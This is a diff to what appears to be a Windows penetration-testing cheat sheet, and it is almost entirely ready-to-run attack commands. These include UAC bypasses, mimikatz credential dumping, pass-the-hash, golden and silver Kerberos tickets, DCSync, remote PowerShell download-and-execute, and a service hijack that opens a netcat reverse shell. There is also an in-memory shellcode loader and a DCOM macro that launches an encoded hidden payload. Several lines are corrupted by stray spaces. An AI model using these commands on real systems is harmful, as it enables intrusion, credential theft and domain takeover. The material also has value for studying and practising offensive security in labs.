@@ -8,7 +8,13 @@ net use z: \\$source_ip\$smb_share
 ```bash
 //$source_ip/$smb_share/tools_windows/bin/whoami.exe
 ```
-
+```
+netsh advfirewall firewall add rule name="forward_port_rule" prot ocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+```
+```
+for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && e cho 10.5.5.%i is up.
+```
 ## Enumeration Scripts
 ```bash
 //$source_ip/$smb_share/tools_windows/windows-privesc-check2.exe --audit -a -o wpc-report
@@ -73,24 +79,47 @@ Firewall rules:
 netsh advfirewall firewall show rule name=all
 ```
 
-UAC Bypass 
-```powershell
-$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
-$RegPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+### General Enumeration
 
-New-Item $RegPath -Force | Out-Null
-Set-ItemProperty -Path $RegPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
+List files everyone can modify
+```
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+Mounted and unmounted volumes:
+```
+mountvol
+```
+Device drivers and kernel modules:
+```
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+```
+```
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D riverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+```
 
-$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -PassThru
-$Process.WaitForExit()
+Running services:
+```
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+```
 
-if (Test-Path $RegPath) {
-  Remove-Item $RegPath -Recurse -Force
-}
+Permission check:
+```
+icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+```
+
+Check service status:
+```
+wmic service where caption="Serviio" get name, caption, state, startmode
 ```
 
 ### Domain Enumeration
 
+#### AD domain name 
+```
+nslookup
+> set type=all
+> _ldap._tcp.dc._msdcs.example.local
+```
 #### ShareFinder - Look for shares on network and check access under current user context & Log to file
 
 ```bash
@@ -162,8 +191,43 @@ python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$targ
 ```bash
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -C "iex ((New-Object System.Net.WebClient).DownloadString('http://$source_ip/tools_windows/nishang/Shells/Invoke-PowerShellTcp.ps1'))"
 ```
+
+## Bypass UAC 
+Bypass UAC and launch PowerShell window as admin
 ```bash
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"$source_ip\",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
+```
+Disable UAC:
+```bash
+reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
+```
+
+UAC Bypass 
+```powershell
+$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
+$RegPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+
+New-Item $RegPath -Force | Out-Null
+Set-ItemProperty -Path $RegPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
+
+$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -PassThru
+$Process.WaitForExit()
+
+if (Test-Path $RegPath) {
+  Remove-Item $RegPath -Recurse -Force
+}
+```
+
+fodhelper.exe (Windows 10 1709)
+<https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/>
+<https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/>
+```
+SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+```
+```
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v Delega teExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.e xe" /f
+C:\Windows\System32\fodhelper.exe
 ```
 
 ## Password Dumping
@@ -185,7 +249,14 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 //$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" exit
 ```
 ```bash
-//$source_ip/$smb_share/tools_windows/mimikatz64.exe log version  "privilege::debug" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" exit
+//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "lsadump::lsa /patch" "lsadump::sam" exit
+```
+```bash
+//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "token::elevate" "lsadump::sam" exit
+```
+```bash
+//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "kerberos::list /export" exit
+tgsrepcrack.py wordlist.txt 1-40a50000-Offse c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```
 ```bash
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
@@ -207,10 +278,7 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 //$source_ip/$smb_share/tools_windows/pstools/procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-Bypass UAC and launch PowerShell window as admin
-```bash
-powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
-```
+
 ```bash
 reg.exe save hklm\sam c:\sam_backup reg.exe save hklm\security c:\security_backup reg.exe save hklm\system c:\system
 ```
@@ -336,6 +404,30 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ```
 ```bash
 //$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -ucqv Spooler /accepteula
+```
+
+### Change service using registry
+
+```
+Set-Location 'HKLM:\SYSTEM\CurrentControlSet'
+$acl = Get-Acl 'HKLM:\SYSTEM\CurrentControlset\Services'
+$acl.Access
+ 
+$idRef = [System.Security.Principal.NTAccount]("domain\user")
+$regRights = [System.Security.AccessControl.RegistryRights]::FullControl
+$inhFlags = [System.Security.AccessControl.InheritanceFlags]::None
+$prFlags = [System.Security.AccessControl.PropagationFlags]::None
+$acType = [System.Security.AccessControl.AccessControlType]::Allow
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule ($idRef, $regRights, $inhFlags, $prFlags, $acType)
+$acl.AddAccessRule($rule)
+
+$acl | Set-Acl -Path 'HKLM:\SYSTEM\CurrentControlset\Services'
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\Services\wuauserv" -Name ImagePath -Value "//$source_ip/$smb_share/tools_windows/bin/nc.exe $source_ip $source_port -e c:\windows\system32\cmd.exe"
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\Services\wuauserv" -Name Start -Value "2"
+
+sc.exe qc wuauserv
+sc.exe stop wuauserv
+sc.exe start wuauserv
 ```
 
 ## File Permissions
@@ -516,6 +608,29 @@ exe2hex [.exe] # alternatively, `wine /usr/share/windows-binaries/exe2bat.exe [.
 cat [.bat] | xclip -selection c # if remotely accessing kali, use `ssh -X`, a bit finicky though
 ```
 
+In memory shell code execution with Powershell:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
+```
+```
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat ionType, uint flProtect);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+$winFunc =
+Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+[Byte[]];
+[Byte[]]$sc = <place your shellcode here>;
+$size = 0x1000;
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc [$i], 1)};
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+
 ## Copy windows binaries
 ```bash
 copy //$source_ip/$smb_share/tools_windows/bin/Regexe.exe
@@ -533,7 +648,10 @@ copy //$source_ip/$smb_share/tools_windows/bin/wget.exe
 copy //$source_ip/$smb_share/tools_windows/bin/whoami.exe
 ```
 
-## Using Credentials 
+## Using Credentia
+```
+while read USER; do echo $USER && smbmap -H 10.10.10.172 -u "$USER" -p "$USER"; done < usernames 
+``` 
 
 ```powershell
 $username = '<username here>'
@@ -567,24 +685,54 @@ powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).Downlo
 ```bash
 powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Invoke-TheHash/Invoke-SMBExec.ps1'); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"
 ```
+
 ```bash
 //$source_ip/$smb_share/tools_windows/pstools/PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd
 ```
+
 ```bash
 runas /profile /user:administrator cmd
 ```
+
 ```bash 
 START /B cmd.exe
 ```
+
 ```bash
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a //$target cmd.exe
 ```
+
+Convert NTLM hash into a Kerberos TGT (overpass the hash) and then use the TGT to access remote machine
+(We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.)
 ```bash
-sekurlsa::pth /user:Administrateur /domain:<domain> /ntlm:cc36cf7a8514893efccd332446158b1a
+sekurlsa::pth /user:Administrateur /domain:<domain> /ntlm:cc36cf7a8514893efccd332446158b1a /run:PowerShell.exe
 ```
+```
+.\PsExec.exe \\dc01 cmd.exe
+```
+
+Pass the Ticket attack takes advantage of the TGS
+Silver-Ticket 
+```
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+```
+
+Golden Ticket
+```
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+misc::cmd
+psexec.exe \\dc01 cmd.exe
+```
+
+DCSync
+```
+lsadump::dcsync /user:Administrator
+```
+
 ```bash
 xfreerdp /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 /v:$target -O
 ```
+
 ```
 winexe -U <user>%<password> //$target cmd.exe
 ```
@@ -718,4 +866,172 @@ dir /s /a proof.txt
 ```
 ```
 findstr /si "proof"
+```
+
+## AD 
+```
+net user /domain
+```
+Current domain:
+```powershell
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
+```
+
+All objects:
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+# Query witin another user's context
+# New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwert y09!")
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+```
+
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="samAccountType=805306368"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+    Write-Host "------------------------"
+}
+```
+
+Groups
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="(objectClass=Group)"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+{
+    $obj.Properties.name
+}
+```
+
+Group contents:
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="(name=Secret_Group)"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+{
+    $obj.Properties.member
+}
+ 
+```
+
+Search by SPN:
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://" $SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="serviceprincipalname=*http*"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    } 
+}
+```
+
+Deleted Objects:
+```powershell
+Get-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true} -Property *
+```
+```powershell
+Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Property *
+```
+
+Browse:
+```powershell
+set-location ad:
+```
+
+NetWkstaUserEnum:
+```powershell
+Import-Module .\PowerView.ps1
+Get-NetLoggedon -ComputerName client251
+```
+
+NetSessionEnum
+```powershell
+Import-Module .\PowerView.ps1
+Get-NetSession -ComputerName dc01
+```
+
+Request token for SPN
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+```
+
+## Powershell
+
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+DCOM to run macro
+```powershell
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.2"))
+$com | Get-Member
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+$com.Run("mymacro")
+```
+```vb
+Sub MyMacro()
+Dim Str As String
+Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+Shell (Str)
+End Sub
+```
+
+Copy file
+```powershell
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
 ```
